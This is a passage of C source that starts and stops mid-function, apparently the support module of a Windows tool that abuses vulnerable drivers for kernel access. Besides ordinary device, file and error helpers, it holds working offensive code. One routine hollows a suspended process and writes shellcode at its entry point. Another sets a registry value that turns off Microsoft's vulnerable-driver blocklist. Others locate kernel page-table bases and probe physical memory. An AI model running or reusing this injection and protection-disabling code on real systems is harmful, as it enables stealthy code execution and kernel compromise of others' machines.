            lastError = ERROR_NOT_ENOUGH_MEMORY;
        }

    }

    SetLastError(lastError);
    return bResult;
}

/*
* supSetupRemoveDriver
*
* Purpose:
*
* Unload and remove device driver installed through SetupAPI.
*
*/
BOOL supSetupRemoveDriver(
    _In_ HDEVINFO DeviceInfo,
    _In_ SP_DEVINFO_DATA* DeviceInfoData
)
{
    if (DeviceInfo != INVALID_HANDLE_VALUE) {
        SetupDiRemoveDevice(DeviceInfo, DeviceInfoData);
        return SetupDiDestroyDeviceInfoList(DeviceInfo);
    }

    return FALSE;
}

/*
* supQueryDeviceProperty
*
* Purpose:
*
* Allocate space and read device property.
*
*/
BOOL supQueryDeviceProperty(
    _In_ HDEVINFO hDevInfo,
    _In_ SP_DEVINFO_DATA* pDevInfoData,
    _In_ ULONG Property,
    _Out_ LPWSTR* PropertyBuffer,
    _Out_opt_ ULONG* PropertyBufferSize
)
{
    BOOL   result = FALSE;
    DWORD  dataType = 0, dataSize, returnLength = 0;
    LPWSTR lpProperty = NULL;

    dataSize = (MAX_PATH * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
    lpProperty = (LPWSTR)supHeapAlloc(dataSize);
    if (lpProperty) {

        result = SetupDiGetDeviceRegistryProperty(hDevInfo,
            pDevInfoData,
            Property,
            &dataType,
            (PBYTE)lpProperty,
            dataSize,
            &returnLength);

        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {

            supHeapFree(lpProperty);
            dataSize = returnLength;
            lpProperty = (LPWSTR)supHeapAlloc(dataSize);
            if (lpProperty) {

                result = SetupDiGetDeviceRegistryProperty(hDevInfo,
                    pDevInfoData,
                    Property,
                    &dataType,
                    (PBYTE)lpProperty,
                    dataSize,
                    &returnLength);

            }

        }

        if (!result) {
            if (lpProperty) {
                supHeapFree(lpProperty);
                lpProperty = NULL;
            }
            dataSize = 0;
        }

    }

    *PropertyBuffer = lpProperty;
    if (PropertyBufferSize)
        *PropertyBufferSize = returnLength;

    return result;
}

/*
* supSetupEnumDevices
*
* Purpose:
*
* Enumerate devices installed through SetupAPI.
*
*/
BOOL supSetupEnumDevices(
    _In_ pfnSetupDeviceEnumCallback Callback,
    _In_ PVOID CallbackParam
)
{
    BOOL bResult = FALSE;
    HDEVINFO deviceInfo;
    SP_DEVINFO_DATA deviceData;

    deviceInfo = SetupDiGetClassDevs(NULL, NULL, NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
    if (deviceInfo == INVALID_HANDLE_VALUE)
        return FALSE;

    RtlSecureZeroMemory(&deviceData, sizeof(deviceData));
    deviceData.cbSize = sizeof(SP_DEVINFO_DATA);

    for (ULONG i = 0; SetupDiEnumDeviceInfo(deviceInfo, i, &deviceData); i++) {

        bResult = Callback(deviceInfo, &deviceData, CallbackParam);
        if (bResult) //found?
            break;

    }

    SetupDiDestroyDeviceInfoList(deviceInfo);

    return bResult;
}

/*
* supReplaceDllEntryPoint
*
* Purpose:
*
* Replace DLL entry point and optionally convert dll to exe.
*
*/
BOOL supReplaceDllEntryPoint(
    _In_ PVOID DllImage,
    _In_ ULONG SizeOfDllImage,
    _In_ LPCSTR lpEntryPointName,
    _In_ BOOL fConvertToExe
)
{
    BOOL bResult = FALSE;
    PIMAGE_NT_HEADERS NtHeaders;
    DWORD DllVirtualSize;
    PVOID DllBase, EntryPoint;

    NtHeaders = RtlImageNtHeader(DllImage);
    if (NtHeaders) {

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(DllImage, &DllVirtualSize);
        if (DllBase) {
            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, (PCHAR)lpEntryPointName);
            if (EntryPoint) {
                //
                // Set new entrypoint and recalculate checksum.
                //
                NtHeaders->OptionalHeader.AddressOfEntryPoint =
                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

                if (fConvertToExe)
                    NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;

                NtHeaders->OptionalHeader.CheckSum =
                    supCalculateCheckSumForMappedFile(DllImage, SizeOfDllImage);

                bResult = TRUE;
            }
            VirtualFree(DllBase, 0, MEM_RELEASE);
        }
    }
    return bResult;
}

/*
* supExtractFileFromDB
*
* Purpose:
*
* Extract requested file from resources.
*
*/
BOOL supExtractFileFromDB(
    _In_ HMODULE ImageBase,
    _In_ LPCWSTR FileName,
    _In_ ULONG FileId
)
{
    NTSTATUS ntStatus;
    ULONG resourceSize = 0, writeBytes = 0;
    PBYTE fileBuffer;

    fileBuffer = (PBYTE)KDULoadResource(FileId,
        ImageBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        TRUE);

    if (fileBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Requested data id cannot be found %lu\r\n", FileId);

        return FALSE;

    }

    writeBytes = (ULONG)supWriteBufferToFile(FileName,
        fileBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(fileBuffer);

    if (resourceSize != writeBytes) {
        supShowHardError("[!] Unable to extract data", ntStatus);
        return FALSE;
    }

    return TRUE;
}

/*
* supExtractFileToTemp
*
* Purpose:
*
* Save given file to local %temp%.
*
*/
VOID supExtractFileToTemp(
    _In_opt_ HMODULE ImageBase,
    _In_opt_ ULONG FileResourceId,
    _In_ LPCWSTR lpTempPath,
    _In_ LPCWSTR lpFileName,
    _In_ BOOL fDelete)
{
    WCHAR szFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
    StringCchPrintf(szFileName,
        MAX_PATH * 2,
        TEXT("%ws\\%ws"),
        lpTempPath,
        lpFileName);

    if (fDelete) {
        DeleteFile(szFileName);
    }
    else {
        if (ImageBase) {
            supExtractFileFromDB(ImageBase, szFileName, FileResourceId);
        }
    }
}

/*
* supDeleteFileWithWait
*
* Purpose:
*
* Removes file from disk.
*
*/
BOOL supDeleteFileWithWait(
    _In_ ULONG WaitMilliseconds,
    _In_ ULONG NumberOfAttempts,
    _In_ LPCWSTR lpFileName
)
{
    ULONG retryCount = NumberOfAttempts;

    do {

        Sleep(WaitMilliseconds);
        if (DeleteFile(lpFileName)) {
            return TRUE;
        }

        retryCount--;

    } while (retryCount);

    return FALSE;
}

/*
* supMapFileAsImage
*
* Purpose:
*
* Create file mapping with SEC_IMAGE flag.
*
*/
PVOID supMapFileAsImage(
    _In_ LPWSTR lpImagePath
)
{
    HANDLE hFile, hMapping = NULL;
    PVOID  pvImageBase = NULL;

    hFile = CreateFile(lpImagePath,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        hMapping = CreateFileMapping(hFile,
            NULL,
            PAGE_READONLY | SEC_IMAGE,
            0,
            0,
            NULL);

        if (hMapping != NULL) {

            pvImageBase = MapViewOfFile(hMapping,
                FILE_MAP_READ, 0, 0, 0);

            CloseHandle(hMapping);
        }
        CloseHandle(hFile);
    }
    return pvImageBase;
}

/*
* supGetEntryPointForMappedFile
*
* Purpose:
*
* Return adjusted entry point address within mapped file.
*
*/
PVOID supGetEntryPointForMappedFile(
    _In_ PVOID ImageBase
)
{
    PIMAGE_DOS_HEADER		 dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_FILE_HEADER		 fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER32 oh32 = (PIMAGE_OPTIONAL_HEADER32)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
    PIMAGE_OPTIONAL_HEADER64 oh64 = (PIMAGE_OPTIONAL_HEADER64)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));

    if (fileHeader->Machine == IMAGE_FILE_MACHINE_I386) {
#pragma warning(push)
#pragma warning(disable: 4312)
        return RtlOffsetToPointer(oh32->ImageBase, oh32->AddressOfEntryPoint);
#pragma warning(pop)
    }
    else if (fileHeader->Machine == IMAGE_FILE_MACHINE_AMD64) {
        return RtlOffsetToPointer(oh64->ImageBase, oh64->AddressOfEntryPoint);
    }
    else
        return NULL;
}

/*
* supInjectPayload
*
* Purpose:
*
* Run payload shellcode at app entry point.
*
*/
NTSTATUS supInjectPayload(
    _In_ PVOID pvTargetImage,
    _In_ PVOID pbShellCode,
    _In_ ULONG cbShellCode,
    _In_ LPWSTR lpTargetModule,
    _Out_ PHANDLE phZombieProcess
)
{
    NTSTATUS                    ntStatus;
    ULONG                       offset, returnLength = 0;
    HANDLE                      sectionHandle = NULL;

    PIMAGE_DOS_HEADER           dosHeader;
    PIMAGE_FILE_HEADER          fileHeader;
    PIMAGE_OPTIONAL_HEADER      optHeader;

    LPVOID                      pvImageBase = NULL, pvLocalBase;
    SIZE_T                      viewSize, readBytes = 0;
    LARGE_INTEGER               secMaxSize;

    PROCESS_BASIC_INFORMATION   processBasicInfo;
    PROCESS_INFORMATION         processInfo;
    STARTUPINFO                 startupInfo;

    do {

        *phZombieProcess = NULL;

        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);

        processInfo.hProcess = NULL;
        processInfo.hThread = NULL;

        dosHeader = (PIMAGE_DOS_HEADER)pvTargetImage;
        fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
        optHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
        secMaxSize.QuadPart = optHeader->SizeOfImage;

        if (fileHeader->Machine != IMAGE_FILE_MACHINE_I386 &&
            fileHeader->Machine != IMAGE_FILE_MACHINE_AMD64)
        {
            ntStatus = STATUS_NOT_SUPPORTED;
            break;
        }

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            NULL,
            &secMaxSize,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        SetLastError(0);

        if (!CreateProcess(NULL,
            lpTargetModule,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &startupInfo,
            &processInfo))
        {
            ntStatus = STATUS_FATAL_APP_EXIT;
            break;
        }

        ntStatus = NtQueryInformationProcess(processInfo.hProcess,
            ProcessBasicInformation,
            &processBasicInfo,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        offset = FIELD_OFFSET(PEB, ImageBaseAddress);

        if (!ReadProcessMemory(processInfo.hProcess,
            RtlOffsetToPointer(processBasicInfo.PebBaseAddress, offset),
            &pvImageBase,
            sizeof(PVOID),
            &readBytes))
        {
            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
            break;
        }

        viewSize = optHeader->SizeOfImage;
        pvLocalBase = NULL;

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvLocalBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewUnmap,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        if (!ReadProcessMemory(processInfo.hProcess,
            pvImageBase,
            pvLocalBase,
            optHeader->SizeOfImage,
            &readBytes))
        {
            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
            break;
        }

        ntStatus = NtUnmapViewOfSection(processInfo.hProcess, pvImageBase);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        viewSize = optHeader->SizeOfImage;

        ntStatus = NtMapViewOfSection(sectionHandle,
            processInfo.hProcess,
            &pvImageBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewShare,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        RtlCopyMemory(RtlOffsetToPointer(pvLocalBase, optHeader->AddressOfEntryPoint),
            pbShellCode,
            cbShellCode);

        ResumeThread(processInfo.hThread);

        *phZombieProcess = processInfo.hProcess;

    } while (FALSE);

    if (!NT_SUCCESS(ntStatus)) {

        if (processInfo.hProcess != NULL)
            CloseHandle(processInfo.hProcess);

    }

    if (sectionHandle != NULL)
        NtClose(sectionHandle);

    if (processInfo.hThread != NULL)
        CloseHandle(processInfo.hThread);

    return ntStatus;
}

/*
* supFilterDeviceIoControl
*
* Purpose:
*
* Call filter driver.
*
* Simplified fltlib!FilterpDeviceIoControl
*
*/
NTSTATUS supFilterDeviceIoControl(
    _In_ HANDLE Handle,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_(InBufferSize) PVOID InBuffer,
    _In_ ULONG InBufferSize,
    _Out_writes_bytes_to_opt_(OutBufferSize, *BytesReturned) PVOID OutBuffer,
    _In_ ULONG OutBufferSize,
    _Out_opt_ PULONG BytesReturned
)
{
    NTSTATUS ntStatus;

    if (BytesReturned)
        *BytesReturned = 0;

    IO_STATUS_BLOCK ioStatusBlock;

    if (DEVICE_TYPE_FROM_CTL_CODE(IoControlCode) == FILE_DEVICE_FILE_SYSTEM) {
        ntStatus = NtFsControlFile(Handle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            IoControlCode,
            InBuffer,
            InBufferSize,
            OutBuffer,
            OutBufferSize);
    }
    else {

        ntStatus = NtDeviceIoControlFile(Handle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            IoControlCode,
            InBuffer,
            InBufferSize,
            OutBuffer,
            OutBufferSize);
    }

    if (ntStatus == STATUS_PENDING) {
        ntStatus = NtWaitForSingleObject(Handle, FALSE, NULL);
        if (NT_SUCCESS(ntStatus))
            ntStatus = ioStatusBlock.Status;
    }

    if (BytesReturned)
        *BytesReturned = (ULONG)ioStatusBlock.Information;

    return ntStatus;
}

/*
* supQueryPhysicalMemoryLayout
*
* Purpose:
*
* Read physical memory layout from registry.
* 
* Use supHeapFree to release allocated memory.
*
*/
PCM_RESOURCE_LIST supQueryPhysicalMemoryLayout(
    VOID
)
{
    LPCWSTR lpKey = L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    LPCWSTR lpValue = L".Translated";
    HKEY hKey;
    DWORD dwType = REG_RESOURCE_LIST, cbData = 0;
    PCM_RESOURCE_LIST pList = NULL;

    LRESULT result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpKey, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {

        result = RegQueryValueEx(hKey, lpValue, 0, &dwType, NULL, &cbData);

        if (result == ERROR_SUCCESS && dwType == REG_RESOURCE_LIST) {

            pList = (PCM_RESOURCE_LIST)supHeapAlloc((SIZE_T)cbData);
            if (pList) {
                RegQueryValueEx(hKey, lpValue, 0, &dwType, (LPBYTE)pList, &cbData);
            }
        }

        RegCloseKey(hKey);
    }

    return pList;
}

/*
* supEnumeratePhysicalMemory
*
* Purpose:
*
* Enumerate physical memory and run callback for each page.
*
*/
BOOL supEnumeratePhysicalMemory(
    _In_ pfnPhysMemEnumCallback Callback,
    _In_ PVOID UserContext
)
{
    PCM_PARTIAL_RESOURCE_DESCRIPTOR pPartialDesc;
    PCM_FULL_RESOURCE_DESCRIPTOR pDesc;
    PCM_RESOURCE_LIST pList = supQueryPhysicalMemoryLayout();

    if (pList == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    for (ULONG i = 0; i < pList->Count; i++) {

        pDesc = &pList->List[i];

        for (ULONG j = 0; j < pDesc->PartialResourceList.Count; j++) {

            pPartialDesc = &pDesc->PartialResourceList.PartialDescriptors[j];
            if (pPartialDesc->Type == CmResourceTypeMemory ||
                pPartialDesc->Type == CmResourceTypeMemoryLarge)
            {
                ULONGLONG length = pPartialDesc->u.Memory.Length;

                switch (pPartialDesc->Flags & CM_RESOURCE_MEMORY_LARGE)
                {
                case CM_RESOURCE_MEMORY_LARGE_40:
                    length <<= 8;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_48:
                    length <<= 16;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_64:
                    length <<= 32;
                    break;
                }

                ULONG_PTR endAddress, queryAddress;
                ULONG x = 0;

                queryAddress = pPartialDesc->u.Memory.Start.QuadPart;
                endAddress = queryAddress + length;

                supPrintfEvent(kduEventInformation, 
                    "[+] Enumerating memory address range 0x%llX -> 0x%llX\r\n", queryAddress, endAddress);

                do {

                    if (x == 0) {
                        printf_s("\r\tProbing memory at 0x%llX with size 0x%llX", queryAddress, PAGE_SIZE * 16);
                        x = 16;
                    }

                    if (Callback(queryAddress, UserContext)) {
                        break;
                    }

                    queryAddress += PAGE_SIZE;
                    --x;

                } while (queryAddress < endAddress);

                printf_s("\33[2K\r\tAddress range probed successfully\r\n");
            }
        }
    }

    supHeapFree(pList);

    return TRUE;
}

/*
* supDetectMsftBlockList
*
* Purpose:
*
* Return state of CI variable enabling/disabling msft block list.
* Windows 11 22H2+ (build >= 22621): missing value = enabled (default).
* Older Windows 10: missing value treated as enabled only if HVCI active, otherwise disabled.
*
*/
BOOL supDetectMsftBlockList(
    _In_ PBOOL Enabled,
    _In_ BOOL Disable,
    _In_ ULONG NtBuildNumber,
    _In_ BOOL HvciActive
)
{
    HKEY hKey;
    DWORD dwEnabled, cbData, dwType;
    LSTATUS r;
    BOOL haveValue, isWin11, success;

    isWin11 = (NtBuildNumber >= NT_WIN11_22H2);
    if (Enabled)
        *Enabled = isWin11 ? TRUE : (HvciActive ? TRUE : FALSE);

    hKey = NULL;
    haveValue = FALSE;

    r = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        L"System\\CurrentControlSet\\Control\\CI\\Config",
        0,
        Disable ? (KEY_QUERY_VALUE | KEY_SET_VALUE) : KEY_QUERY_VALUE,
        &hKey);

    if (r == ERROR_FILE_NOT_FOUND && Disable) {
        r = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
            L"System\\CurrentControlSet\\Control\\CI\\Config",
            0, NULL, REG_OPTION_NON_VOLATILE,
            KEY_SET_VALUE | KEY_QUERY_VALUE,
            NULL, &hKey, NULL);
    }

    if (r == ERROR_SUCCESS) {

        cbData = sizeof(DWORD);
        dwType = REG_DWORD;
        dwEnabled = 0;
        r = RegQueryValueEx(hKey,
            L"VulnerableDriverBlocklistEnable",
            0,
            &dwType,
            (LPBYTE)&dwEnabled,
            &cbData);

        if (r == ERROR_SUCCESS && dwType == REG_DWORD) {
            haveValue = TRUE;
            if (Enabled)
                *Enabled = (dwEnabled > 0);
        }
        else if (r == ERROR_FILE_NOT_FOUND) {
            r = ERROR_SUCCESS;
        }

        if (Disable && r == ERROR_SUCCESS) {
            if (!haveValue || dwEnabled != 0) {
                dwEnabled = 0;
                cbData = sizeof(DWORD);
                if (RegSetValueEx(hKey,
                    L"VulnerableDriverBlocklistEnable",
                    0,
                    REG_DWORD,
                    (LPBYTE)&dwEnabled,
                    cbData) != ERROR_SUCCESS)
                {
                    r = GetLastError();
                }
            }
            if (r == ERROR_SUCCESS && Enabled)
                *Enabled = FALSE;
        }

        RegCloseKey(hKey);
    }
    else if (r == ERROR_FILE_NOT_FOUND) {
        r = ERROR_SUCCESS;
    }

    if (r == ERROR_SUCCESS && !haveValue && !Disable && Enabled) {
        if (isWin11)
            *Enabled = TRUE;
        else
            *Enabled = HvciActive ? TRUE : FALSE;
    }

    success = (r == ERROR_SUCCESS);
    SetLastError((DWORD)r);
    return success;
}

/*
* supIsSupportedCpuVendor
*
* Purpose:
*
* Check if the current CPU vendor is match to supplied.
*
*/
BOOL supIsSupportedCpuVendor(
    _In_ LPCSTR Vendor,
    _In_ ULONG Length
)
{
    CHAR vendorString[0x20];

    RtlFillMemory(vendorString, sizeof(vendorString), 0);
    GET_CPU_VENDOR_STRING(vendorString);

    return (_strncmp_a(vendorString, Vendor, Length) == 0);
}

/*
* supResolveMiPteBaseAddress
*
* Purpose:
*
* Query MiPteBase address in kernel.
*
*/
ULONG_PTR supResolveMiPteBaseAddress(
    _In_opt_ PVOID NtOsBase
)
{
    BOOL bFree = FALSE;
    ULONG offset = 0;
    PBYTE ptrCode;
    PVOID ntosBase = NtOsBase;
    ULONG_PTR pteBaseAddress = 0, ntosLoadedBase, address = 0;
    hde64s hs;

    WCHAR szNtos[MAX_PATH * 2];

    do {

        StringCchPrintf(szNtos, RTL_NUMBER_OF(szNtos), 
            TEXT("%ws\\system32\\%ws"),
            USER_SHARED_DATA->NtSystemRoot,
            NTOSKRNL_EXE);       

        if (ntosBase == NULL) {
            ntosBase = LoadLibraryEx(szNtos, NULL, DONT_RESOLVE_DLL_REFERENCES);
            bFree = (ntosBase != NULL);
        }

        if (ntosBase == NULL)
            break;

        ntosLoadedBase = supGetNtOsBase();
        if (ntosLoadedBase == 0)
            break;

        if (!symLoadImageSymbols(szNtos, (PVOID)ntosBase, 0))
            break;

        if (!symLookupAddressBySymbol("MiFillPteHierarchy", &address))
            break;

        ptrCode = (PBYTE)address;

        RtlSecureZeroMemory(&hs, sizeof(hs));

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == 10) {

                // mov r8, MiPteBase
                if (*(PUSHORT)(ptrCode + offset) == 0xb849) {
                    ptrCode = ptrCode + offset + 2;
                    pteBaseAddress = ntosLoadedBase + ptrCode - (PBYTE)ntosBase;
                    break;
                }

            }

            offset += hs.len;

        } while (offset < 64);

    } while (FALSE);

    if (bFree) FreeLibrary((HMODULE)ntosBase);

    return pteBaseAddress;
}

/*
* supCreatePteHierarchy
*
* Purpose:
*
* nt!MiCreatePteHierarchy rip-off.
*
*/
VOID supCreatePteHierarchy(
    _In_ ULONG_PTR VirtualAddress,
    _Inout_ MI_PTE_HIERARCHY* PteHierarchy,
    _In_ ULONG_PTR MiPteBase
)
{
    ///
    /// Resolve the PTE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PTE = VirtualAddress;

    ///
    /// Resolve the PDE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PDE = VirtualAddress;

    ///
    /// Resolve the PPE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PPE = VirtualAddress;

    ///
    /// Resolve the PXE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PXE = VirtualAddress;
}

/*
* supShowHardError
*
* Purpose:
*
* Display hard error.
*
*/
VOID supShowHardError(
    _In_ LPCSTR Message,
    _In_ NTSTATUS HardErrorStatus
)
{
    ULONG dwFlags;
    HMODULE hModule = NULL;
    WCHAR errorBuffer[1024];

    if (HRESULT_FACILITY(HardErrorStatus) == FACILITY_WIN32) {
        dwFlags = FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM;
    }
    else {
        dwFlags = FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_HMODULE;
        hModule = GetModuleHandle(RtlNtdllName);
    }

    RtlSecureZeroMemory(errorBuffer, sizeof(errorBuffer));

    if (FormatMessage(dwFlags,
        hModule,
        HardErrorStatus,
        0,
        errorBuffer,
        RTL_NUMBER_OF(errorBuffer),
        NULL))
    {
        supPrintfEvent(kduEventError, "%s, NTSTATUS (0x%lX): %ws",
            Message,
            HardErrorStatus,
            errorBuffer);

    }
    else {
        supPrintfEvent(kduEventError, "%s, NTSTATUS (0x%lX)\r\n",
            Message,
            HardErrorStatus);
    }
}

/*
* supShowWin32Error
*
* Purpose:
*
* Display win32 error.
*
*/
VOID supShowWin32Error(
    _In_ LPCSTR Message,
    _In_ DWORD Win32Error
)
{
    ULONG dwFlags = FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM;
    WCHAR errorBuffer[1024];

    RtlSecureZeroMemory(errorBuffer, sizeof(errorBuffer));

    if (FormatMessage(dwFlags,
        NULL,
        Win32Error,
        0,
        errorBuffer,
        RTL_NUMBER_OF(errorBuffer),
        NULL))
    {
        supPrintfEvent(kduEventError, "%s, GetLastError %lu: %ws",
            Message,
            Win32Error,
            errorBuffer);

    }
    else {
        supPrintfEvent(kduEventError, "%s, GetLastError %lu\r\n",
            Message,
            Win32Error);
    }
}

/*
* supIpcOnException
*
* Purpose:
*
* ALPC receive exception callback.
*
*/
VOID CALLBACK supIpcOnException(
    _In_ ULONG ExceptionCode,
    _In_opt_ PVOID UserContext
)
{
    UNREFERENCED_PARAMETER(UserContext);

    supPrintfEvent(kduEventError,
        "[!] Exception 0x%lx thrown during IPC callback\r\n", ExceptionCode);
}

/*
* supIpcDuplicateHandleCallback
*
* Purpose:
*
* ALPC receive message callback for IPC_GET_HANDLE case.
*
*/
VOID CALLBACK supIpcDuplicateHandleCallback(
    _In_ PCLIENT_ID ClientId,
    _In_ PKDU_MSG Message,
    _In_opt_ PVOID UserContext
)
{
    KDU_CONTEXT* Context = (PKDU_CONTEXT)UserContext;

    if (Context == NULL)
        return;

    __try {

        if (Message->Function == IPC_GET_HANDLE &&
            Message->Status == STATUS_SECRET_TOO_LONG)
        {
            HANDLE hProcess = NULL, hNewHandle = NULL;
            OBJECT_ATTRIBUTES obja;

            InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);

            if (NT_SUCCESS(NtOpenProcess(&hProcess,
                PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_TERMINATE,
                &obja,
                ClientId)))
            {
                PVOID wow64Information = NULL;
                ULONG returnLength;
                BOOL validLength = FALSE;

                if (NT_SUCCESS(NtQueryInformationProcess(hProcess,
                    ProcessWow64Information,
                    &wow64Information,
                    sizeof(wow64Information),
                    &returnLength)))
                {
                    if (wow64Information == NULL)
                        validLength = (Message->ReturnedLength == sizeof(HANDLE));
                    else
                        validLength = (Message->ReturnedLength == sizeof(ULONG));

                    if (validLength) {

                        if (NT_SUCCESS(NtDuplicateObject(
                            hProcess,
                            (HANDLE)Message->Data,
                            NtCurrentProcess(),
                            &hNewHandle,
                            0,
                            0,
                            DUPLICATE_SAME_ACCESS)))
                        {
                            Context->DeviceHandle = hNewHandle;
                        }

                    }

                }
                NtTerminateProcess(hProcess, STATUS_TOO_MANY_SECRETS);
                NtClose(hProcess);
            }

        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return;
    }
}

/*
* supQuerySuperfetchInformation
*
* Purpose:
*
* Query Superfetch information.
*
*/
NTSTATUS supQuerySuperfetchInformation(
    _In_ SUPERFETCH_INFORMATION_CLASS InfoClass,
    _In_ PVOID Buffer,
    _In_ ULONG Length,
    _Out_opt_ PULONG ReturnLength)
{
    NTSTATUS ntStatus;
    ULONG returnedLength = 0;

    struct {
        ULONG Version;
        ULONG Magic;
        ULONG InfoClass;
        PVOID Data;
        ULONG Length;
    } superfetchInfo;

    RtlSecureZeroMemory(&superfetchInfo, sizeof(superfetchInfo));
    superfetchInfo.Version = SUPERFETCH_VERSION;
    superfetchInfo.Magic = SUPERFETCH_MAGIC;
    superfetchInfo.InfoClass = (ULONG)InfoClass;
    superfetchInfo.Data = Buffer;
    superfetchInfo.Length = Length;

    ntStatus = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)79,
        &superfetchInfo,
        sizeof(superfetchInfo),
        &returnedLength);

    if (ReturnLength)
        *ReturnLength = returnedLength;

    return ntStatus;
}

/*
* supQuerySuperfetchMemoryRanges
*
* Purpose:
*
* Query physical memory ranges via Superfetch.
* Automatically selects V1 or V2 based on OS version.
*
*/
BOOL supQuerySuperfetchMemoryRanges(
    _Out_ PVOID* RangeBuffer,
    _Out_ PULONG RangeCount)
{
    NTSTATUS ntStatus;
    ULONG bufferLength = 0;
    ULONG ntBuildNumber;
    PVOID buffer = NULL;

    struct {
        ULONG Version;
        ULONG Flags;
        ULONG RangeCount;
    } rangeInfoV2;

    struct {
        ULONG Version;
        ULONG RangeCount;
    } rangeInfoV1;

    *RangeBuffer = NULL;
    *RangeCount = 0;

    ntBuildNumber = NtCurrentPeb()->OSBuildNumber;

    //
    // Windows 10 1809 (17763) and later use V2
    //
    if (ntBuildNumber >= NT_WIN10_REDSTONE5) {

        RtlSecureZeroMemory(&rangeInfoV2, sizeof(rangeInfoV2));
        rangeInfoV2.Version = 2;

        ntStatus = supQuerySuperfetchInformation(
            SuperfetchMemoryRangesQuery,
            &rangeInfoV2,
            sizeof(rangeInfoV2),
            &bufferLength);

        if (ntStatus == STATUS_BUFFER_TOO_SMALL && bufferLength > 0) {

            buffer = supHeapAlloc(bufferLength);
            if (buffer == NULL)
                return FALSE;

            RtlSecureZeroMemory(buffer, bufferLength);
            ((PPF_MEMORY_RANGE_INFO_V2)buffer)->Version = 2;

            ntStatus = supQuerySuperfetchInformation(
                SuperfetchMemoryRangesQuery,
                buffer,
                bufferLength,
                NULL);

            if (NT_SUCCESS(ntStatus)) {
                *RangeBuffer = buffer;
                *RangeCount = ((PPF_MEMORY_RANGE_INFO_V2)buffer)->RangeCount;
                return TRUE;
            }

            supHeapFree(buffer);
        }
    }

    //
    // Older Windows or V2 failed - try V1
    //
    RtlSecureZeroMemory(&rangeInfoV1, sizeof(rangeInfoV1));
    rangeInfoV1.Version = 1;
    bufferLength = 0;

    ntStatus = supQuerySuperfetchInformation(
        SuperfetchMemoryRangesQuery,
        &rangeInfoV1,
        sizeof(rangeInfoV1),
        &bufferLength);

